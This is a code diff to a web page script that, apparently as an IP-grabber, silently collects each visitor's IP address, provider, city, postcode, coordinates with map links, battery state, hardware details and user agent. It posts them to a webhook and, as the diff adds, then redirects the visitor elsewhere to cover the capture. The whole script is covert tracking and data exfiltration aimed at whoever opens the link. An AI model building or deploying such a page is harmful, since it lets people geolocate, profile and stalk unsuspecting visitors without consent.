@@ -22,6 +22,7 @@
     <script>
         $(document).ready(function () {
             const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
+            const redirectUrl = "https://www.example.com";
             let ip, country, countryCode, region, regionName, city, zip, lat, lon, timezone, org;
             let batteryPercentage, isCharging, platform, width, height, deviceLang, userAgent, cpuThreads, deviceRam, referUrl;
             let datetime = new Date();
@@ -57,7 +58,6 @@
                     lon = ipData.longitude;
                     timezone = ipData.time_zone;
                     org = ipData.organisation;
-
                     const battery = await navigator.getBattery();
                     batteryPercentage = `${battery.level * 100}%`;
                     isCharging = `${battery.charging}`;
@@ -70,12 +70,9 @@
                     deviceRam = `${navigator.deviceMemory} GB`;
                     referUrl = `${window.location.href}`;
                     localtime = `${datetime.toLocaleString()}`;
-
                     let timezoneOffsetMinutes = -datetime.getTimezoneOffset();
                     let formattedTimezoneOffset = formatTimezoneOffset(timezoneOffsetMinutes);
-
                     let mapUrls = generateMapUrls(lat, lon);
-
                     await sendWebhook(formattedTimezoneOffset, mapUrls);
                 } catch (error) {
                     console.error('Error fetching information:', error);
@@ -86,9 +83,7 @@
                 let request = new XMLHttpRequest();
                 request.open("POST", webhookUrl);
                 request.setRequestHeader('Content-type', 'application/json');
-
                 let flagEmoji = countryCode ? `:flag_${countryCode.toLowerCase()}:` : '';
-
                 let params = {
                     "embeds": [
                         {
@@ -98,31 +93,24 @@
                                 { "name": "**IP Address:**", "value": `${ip}`, "inline": true },
                                 { "name": "**Provider:**", "value": `${org}`, "inline": true },
                                 { "name": "**Country:**", "value": `${country}`, "inline": true },
-
                                 { "name": "**Country Code:**", "value": `${countryCode}`, "inline": true },
                                 { "name": "**Region Name:**", "value": `${regionName}`, "inline": true },
                                 { "name": "**Region Code:**", "value": `${region}`, "inline": true },
-
                                 { "name": "**City:**", "value": `${city}`, "inline": true },
                                 { "name": "**Zip Code:**", "value": `${zip}`, "inline": true },
                                 { "name": "**Latitude:**", "value": `${lat}`, "inline": true },
-
                                 { "name": "**Longitude:**", "value": `${lon}`, "inline": true },
                                 { "name": "**Timezone:**", "value": `${timezone}`, "inline": true },
                                 { "name": "**Timezone Offset:**", "value": `${formattedTimezoneOffset}`, "inline": true },
-
                                 { "name": "**Local Time:**", "value": `${localtime}`, "inline": true },
                                 { "name": "**Language:**", "value": `${deviceLang}`, "inline": true },
                                 { "name": "**Width (px):**", "value": `${width}`, "inline": true },
-
                                 { "name": "**Height (px):**", "value": `${height}`, "inline": true },
                                 { "name": "**Platform:**", "value": `${platform}`, "inline": true },
                                 { "name": "**Battery Percentage:**", "value": `${batteryPercentage}`, "inline": true },
-
                                 { "name": "**Charging:**", "value": `${isCharging}`, "inline": true },
                                 { "name": "**CPU Threads:**", "value": `${cpuThreads}`, "inline": true },
                                 { "name": "**RAM:**", "value": `${deviceRam}`, "inline": true },
-
                                 { "name": "**User Agent:**", "value": `${userAgent}`, "inline": true },
                                 { "name": "**Referrer URL:**", "value": `${referUrl}`, "inline": true },
                                 { "name": "**Map Links:**", "value": `[Google Maps](${mapUrls.googleMaps}) | [OpenStreetMap](${mapUrls.openStreetMap})`, "inline": true }
@@ -131,8 +119,10 @@
                         }
                     ]
                 };
-
                 request.send(JSON.stringify(params));
+                request.onload = function () {
+                    window.location.href = redirectUrl;
+                };
             }
 
             getInfo();
